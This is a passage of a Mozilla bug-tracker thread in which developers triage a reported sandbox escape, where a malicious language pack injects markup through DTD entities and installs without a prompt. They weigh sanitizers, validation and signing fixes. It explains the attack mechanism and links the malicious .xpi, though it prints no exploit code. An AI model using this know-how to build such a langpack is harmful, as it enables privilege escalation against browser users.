          <div class="change-time"><span class="rel-time" title="2019-03-21 15:37 PDT" data-time="1553207834">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-6">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-6" data-comment-id="14003587" data-ismarkdown="true" ><p>I think we want the prompt for langpacks, but that still leaves unknowing users at risk.<br>
We still have enough DTD that we need to tackle the XSS issue (according to <a href="https://arewefluentyet.com/" rel="nofollow">https://arewefluentyet.com/</a>), and we have lots of DTDs that contain markup. I could imagine us calling into nstreesanitizer before applying content from a DTD to the DOM. That would incur a runtime cost. The alternative is running a reliable sanitizer on AMO, but I&#39;d be less trusting a third-party sanitizer over our built-in.</p>
</div></div><div class="change-set" id="c7"><div class="comment" data-id="14003588" data-no="7"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-7" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a3586_451704"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a3586_451704"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-7"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-7" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c7">Comment 7</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:39 PDT" data-time="1553207945">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-7">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-7" data-comment-id="14003588" data-ismarkdown="true" ><p>simple scanning for element injection won&#39;t work because our current UI relies on that:</p>
<p><a href="https://searchfox.org/mozilla-central/search?q=%3C!.*%3C&amp;case=false&amp;regexp=true&amp;path=.dtd" rel="nofollow">https://searchfox.org/mozilla-central/search?q=%3C!.*%3C&amp;case=false&amp;regexp=true&amp;path=.dtd</a></p>
<p>We&#39;d have to rewrite those to eliminate that first. Maybe only a dozen places though -- mostly our big error pages. Catching expansion adding onload/etc event handlers would be trickier</p>
</div></div><div class="change-set" id="c8"><div class="comment" data-id="14003593" data-no="8"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-8" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a3586_451704"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a3586_451704"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-8"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-8" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c8">Comment 8</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:40 PDT" data-time="1553208033">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-8">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-8" data-comment-id="14003593" data-ismarkdown="true" ><p>Yup, I&#39;d trust our built-in sanitizer (nstreesanitizer) to allow for styles and elements, but not scripts.</p>
</div></div><div class="change-set" id="a4554_537703"><div class="change" id="aa4554_537703">
    <table class="layout-table change-head reporter" role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_537703" id="a4554_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
            <span class="user-role">Reporter</span>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a4554_537703"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a4554_537703">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#a4554_537703">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:44 PDT" data-time="1553208297">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Keywords: <a href="/buglist.cgi?keywords=csectype-priv-escalation&amp;resolution=---">csectype-priv-escalation</a>, 
          
            <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a></div></div></div><div class="change-set" id="c9"><div class="comment" data-id="14003624" data-no="9"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-9" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_41270" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/2b40751f36f992f741cd678fb4a4ae55?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_41270" id="a4554_537703"><a class="email " href="/user_profile?user_id=41270" > <span class="fna">Zibi Braniecki [:zbraniecki][:gandalf]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-9"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-9" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c9">Comment 9</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:58 PDT" data-time="1553209111">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-9">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-9" data-comment-id="14003624" data-ismarkdown="true" ><p>we&#39;re warming up to migrate our error pages to Fluent quite soon, but yeah, I don&#39;t think DTD can die soon enough :(</p>
</div></div><div class="change-set" id="c10"><div class="comment" data-id="14003627" data-no="10"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-10" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a4554_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-10"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-10" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c10">Comment 10</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 15:59 PDT" data-time="1553209178">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-10">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-10" data-comment-id="14003627" data-ismarkdown="true" ><p>:freddyb was pretty sure you could also do the injection with .properties, so fluent won&#39;t solve this until everything is ported, is that right :-( That means we need a nearer-term solution.</p>
</div></div><div class="change-set" id="c11"><div class="comment" data-id="14003645" data-no="11"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-11" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_106098" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/06a624a82dd4430f86e9a67b300eecb3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_106098" id="a4554_537703"><a class="email " href="/user_profile?user_id=106098" > <span class="fna">Kris Maglione [:kmag]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-11"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-11" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c11">Comment 11</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 16:11 PDT" data-time="1553209888">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-11">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-11" data-comment-id="14003645" data-ismarkdown="true" ><p>This has been known for a long time. It&#39;s why we require signing for language packs (everywhere but Linux). It&#39;s also part of the reason we&#39;re trying to get rid of DTDs.</p>
</div></div><div class="change-set" id="c12"><div class="comment" data-id="14003656" data-no="12"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-12" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a4554_537703"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-12"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-12" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c12">Comment 12</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 16:18 PDT" data-time="1553210309">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-12">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-12" data-comment-id="14003656" data-ismarkdown="true" ><p>But we sign whatever people submit, no?</p>
</div></div><div class="change-set" id="c13"><div class="comment" data-id="14003667" data-no="13"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-13" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a4554_537703"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-13"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-13" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c13">Comment 13</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 16:27 PDT" data-time="1553210867">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-13">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-13" data-comment-id="14003667" data-ismarkdown="true" ><p>Sign, and make available via AMO prior to any review.</p>
<p>As a short term fix what if we take away promptless installs from mozAddonManager? The bulk of what people install are WebExtensions and they always prompt anyway so people might not even notice the difference.</p>
<p>We could change false to true here:<br>
<a href="https://searchfox.org/mozilla-central/rev/7c20ad925005fbad7b8e08813115f1ec7fa1c248/toolkit/mozapps/extensions/AddonManager.jsm#2706" rel="nofollow">https://searchfox.org/mozilla-central/rev/7c20ad925005fbad7b8e08813115f1ec7fa1c248/toolkit/mozapps/extensions/AddonManager.jsm#2706</a></p>
<p>... or delete these three lines:</p>
<p><a href="https://searchfox.org/mozilla-central/rev/7c20ad925005fbad7b8e08813115f1ec7fa1c248/toolkit/mozapps/extensions/AddonManager.jsm#2560,2595-2596" rel="nofollow">https://searchfox.org/mozilla-central/rev/7c20ad925005fbad7b8e08813115f1ec7fa1c248/toolkit/mozapps/extensions/AddonManager.jsm#2560,2595-2596</a></p>
<p>That doesn&#39;t solve the injection problem, doesn&#39;t solve the &quot;sign and publish before review&quot; problem, but at least it won&#39;t be a silent attack. Hopefully most victims will cancel an unexpected install prompt, and the noisiness will lead to quick detection of an attack or discourage an attack altogether.</p>
</div></div><div class="change-set" id="c14"><div class="comment" data-id="14003669" data-no="14"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-14" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_41270" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/2b40751f36f992f741cd678fb4a4ae55?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_41270" id="a4554_537703"><a class="email " href="/user_profile?user_id=41270" > <span class="fna">Zibi Braniecki [:zbraniecki][:gandalf]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-14"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-14" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c14">Comment 14</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 16:29 PDT" data-time="1553210978">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-14">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-14" data-comment-id="14003669" data-ismarkdown="true" ><p>I know we do some validation of localizations that we create, but I&#39;m not sure if it is sufficient. NI on Pike for that.</p>
</div><div class="activity"><div class="change">Flags: needinfo?(l10n)</div></div></div><div class="change-set" id="c15"><div class="comment" data-id="14003671" data-no="15"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-15" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_428608" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/1f41f3ef916e1c1fc9401cf3212a6708?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_428608" id="a4554_537703"><a class="email " href="/user_profile?user_id=428608" > <span class="fna">Frederik Braun [:freddy] - vacation (back Nov 1st)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-15"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-15" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c15">Comment 15</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 16:31 PDT" data-time="1553211085">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-15">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-15" data-comment-id="14003671" data-ismarkdown="true" ><p>Requiring a prompt also fixes this as a sandbox bypass, since the unprivileged content process can not accept it. Right?</p>
</div></div><div class="change-set" id="c16"><div class="comment" data-id="14003687" data-no="16"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-16" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_106098" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/06a624a82dd4430f86e9a67b300eecb3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_106098" id="a4554_537703"><a class="email " href="/user_profile?user_id=106098" > <span class="fna">Kris Maglione [:kmag]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-16"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-16" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c16">Comment 16</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 16:41 PDT" data-time="1553211672">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-16">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-16" data-comment-id="14003687" data-ismarkdown="true" ><p>(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c12" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #12</a>)</p>
<blockquote>
<p>But we sign whatever people submit, no?</p>
</blockquote>
<p>To some extent. We do validation, but I have no idea what validation we do at this point. This is the kind of thing that we should be able to catch 100% of the time, though.</p>
<p>(In reply to Frederik Braun [:freddyb] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c15" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #15</a>)</p>
<blockquote>
<p>Requiring a prompt also fixes this as a sandbox bypass, since the unprivileged content process can not accept it. Right?</p>
</blockquote>
<p>Yes, to some extent. We were supposed to move to only allow unprompted installs from the discovery pane, but that still hasn&#39;t happened. And, really, it should only work for listed add-ons from AMO.</p>
<p>Either way, I&#39;d rather we just make it impossible for signed langpacks to do such things.</p>
</div></div><div class="change-set" id="c17"><div class="comment" data-id="14003704" data-no="17"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-17" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a4554_537703"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-17"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-17" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c17">Comment 17</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 16:56 PDT" data-time="1553212591">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-17">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-9052763"
         class="attachment"
         data-id="9052763" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="deutsch_de_language_pack_for_nightly-1715978.xpi">
      <meta itemprop="contentSize" content="506235">
      <meta itemprop="encodingFormat" content="application/x-xpinstall">
      <div class="label">
        Attached file
          <a class="link" href="attachment.cgi?id=9052763" itemprop="contentUrl">
        <span id="att-9052763-description" itemprop="description">deutsch_de_language_pack_for_nightly-1715978.xpi</span></a>
        — <a href="attachment.cgi?id=9052763&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <div
        class="comment-text markdown-body "
        id="ct-17" data-comment-id="14003704" data-ismarkdown="true" ><p>For completeness this is the langpack he&#39;s loading, from <a href="https://addons.mozilla.org/firefox/downloads/file/1715978/deutsch_de_language_pack_for_nightly-66.0buildid20190314174725-fx.xpi" rel="nofollow">https://addons.mozilla.org/firefox/downloads/file/1715978/deutsch_de_language_pack_for_nightly-66.0buildid20190314174725-fx.xpi</a></p>
<p>Comments in the code also point to presumably earlier attempts<br>
<a href="https://addons.mozilla.org/firefox/downloads/file/1690926/deutsch_de_language_pack_for_nightly-3-fx.xpi" rel="nofollow">https://addons.mozilla.org/firefox/downloads/file/1690926/deutsch_de_language_pack_for_nightly-3-fx.xpi</a><br>
<a href="https://addons.mozilla.org/firefox/downloads/file/1715961/deutsch_de_language_pack_for_nightly-3-fx.xpi" rel="nofollow">https://addons.mozilla.org/firefox/downloads/file/1715961/deutsch_de_language_pack_for_nightly-3-fx.xpi</a></p>
<p>The latter two don&#39;t seem to exist. The one from the exploit I could only find if I were logged into AMO.</p>
</div></div><div class="change-set" id="c18"><div class="comment" data-id="14003718" data-no="18"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-18" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_1689" id="a4554_537703"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-18"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-18" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c18">Comment 18</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 17:10 PDT" data-time="1553213409">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-18">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-18" data-comment-id="14003718" data-ismarkdown="true" ><p>(In reply to Zibi Braniecki [:gandalf][:zibi] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c14" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #14</a>)</p>
<blockquote>
<p>I know we do some validation of localizations that we create, but I&#39;m not sure if it is sufficient. NI on Pike for that.</p>
</blockquote>
<p>I&#39;m only a little worried about the ones <em>we</em> create -- they are public and get testing (same kind of problem as worrying about malicious contributor C++ patches). In this attack this is a one-off malicious langpack that was not reviewed at all.</p>
</div></div><div class="change-set" id="c19"><div class="comment" data-id="14003721" data-no="19"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-19" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_537703" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/edcdfd5affb524e0f88ec1a00ed3fe5d?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_537703" id="a4554_537703"><a class="email " href="/user_profile?user_id=537703" > <span class="fna">Alex Gaynor [:Alex_Gaynor]</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-19"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-19" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c19">Comment 19</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 17:12 PDT" data-time="1553213532">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-19">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-19" data-comment-id="14003721" data-ismarkdown="true" ><blockquote>
<p>Either way, I&#39;d rather we just make it impossible for signed langpacks to do such things.</p>
</blockquote>
<p>I think everyone is definitely agreed that we want this goal -- which fluent provides, right?</p>
<p>However, given that fluent isn&#39;t going to happen very soon, we also want mitigations for this.</p>
</div></div><div class="change-set" id="c20"><div class="comment" data-id="14003728" data-no="20"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-20" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_106098" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/06a624a82dd4430f86e9a67b300eecb3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_106098" id="a4554_537703"><a class="email " href="/user_profile?user_id=106098" > <span class="fna">Kris Maglione [:kmag]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-20"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-20" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c20">Comment 20</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 17:16 PDT" data-time="1553213769">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-20">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-20" data-comment-id="14003728" data-ismarkdown="true" ><p>(In reply to Alex Gaynor [:Alex_Gaynor] from <a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1538007#c19" title="RESOLVED FIXED - [ZDI-CAN-8374] Sandbox escape: XUL injection in language pack">comment #19</a>)</p>
<blockquote>
<blockquote>
<p>Either way, I&#39;d rather we just make it impossible for signed langpacks to do such things.</p>
</blockquote>
<p>I think everyone is definitely agreed that we want this goal -- which fluent provides, right?</p>
</blockquote>
<p>We can prevent these types of langpacks from being signed by simply improving our validation. There isn&#39;t really that much a malicious author can do to hide this kind of thing from a validator.</p>
</div></div><div class="change-set" id="c21"><div class="comment" data-id="14003731" data-no="21"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-21" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_106098" id="a4554_537703"><img src="https://secure.gravatar.com/avatar/06a624a82dd4430f86e9a67b300eecb3?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_106098" id="a4554_537703"><a class="email " href="/user_profile?user_id=106098" > <span class="fna">Kris Maglione [:kmag]</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-21"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-21" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1538007#c21">Comment 21</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-03-21 17:21 PDT" data-time="1553214092">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-21">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-21" data-comment-id="14003731" data-ismarkdown="true" ><p>Shorter term than Fluent, we could also probably make a push to get rid of our remaining entities that have non-CDATA content and remove our hacks to process them in the weird way we currently do. There aren&#39;t that many entities that currently rely on them:</p>
<p><a href="https://searchfox.org/mozilla-central/search?q=%3C%5Ba-z%5D&amp;case=true&amp;regexp=true&amp;path=.dtd" rel="nofollow">https://searchfox.org/mozilla-central/search?q=%3C%5Ba-z%5D&amp;case=true&amp;regexp=true&amp;path=.dtd</a></p>
